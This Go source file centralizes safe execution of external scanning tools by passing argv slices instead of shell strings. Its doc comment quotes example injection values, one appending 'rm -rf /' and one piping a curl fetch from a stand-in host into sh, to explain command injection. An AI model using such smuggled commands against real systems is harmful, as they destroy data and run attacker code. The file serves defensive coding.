// Package safety centralizes the two security requirements from the spec
// that are easy to get right once and easy to get wrong if every module
// reimplements them: no shell interpolation when shelling out to external
// tools, and no path traversal when a wordlist path comes from a config
// file an attacker might have tampered with.
package safety

import (
	"context"
	"fmt"
	"os/exec"
)

// RunTool executes an external tool with argv passed as separate slice
// elements — never via "sh -c" string concatenation. This is the only
// function in the codebase that should call exec.Command/CommandContext
// for third-party tools (whatweb, feroxbuster, gowitness); every module
// routes through it so the no-shell-interpolation guarantee has one
// enforcement point instead of N.
//
// Why this matters (the "why" before the "how"): exec.Command("sh", "-c",
// "whatweb "+target) hands the shell a single string it re-parses for
// metacharacters. A target value of "example.com; rm -rf /" or
// "example.com`curl evil.sh|sh`" becomes two commands, not one argument,
// because the shell treats ';' and backticks as syntax. exec.Command with
// a []string argv never invokes a shell to interpret the string — each
// element is passed directly to execve(2) as one argument, so a
// semicolon or backtick inside it is just four bytes of a hostname, with
// no special meaning at all. That is the real difference between a
// command injection vulnerability and an ordinary function call.
func RunTool(ctx context.Context, bin string, args []string) ([]byte, error) {
	// #nosec G204 -- args are a []string argv, not shell-interpolated; see
	// doc comment above.
	cmd := exec.CommandContext(ctx, bin, args...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return out, fmt.Errorf("running %s: %w", bin, err)
	}
	return out, nil
}

// RunToolCapped behaves like RunTool but returns a sentinel-free nil
// output in the all-too-common case where the tool isn't installed, so
// callers can treat "tool missing" as a soft failure (log + skip) rather
// than aborting the whole target pipeline. The distinction matters: a
// missing optional tool shouldn't fail-closed a target the way a scope
// violation must.
func RunToolCapped(ctx context.Context, bin string, args []string) ([]byte, error, bool) {
	if _, err := exec.LookPath(bin); err != nil {
		return nil, err, false // not installed
	}
	out, err := RunTool(ctx, bin, args)
	return out, err, true
}
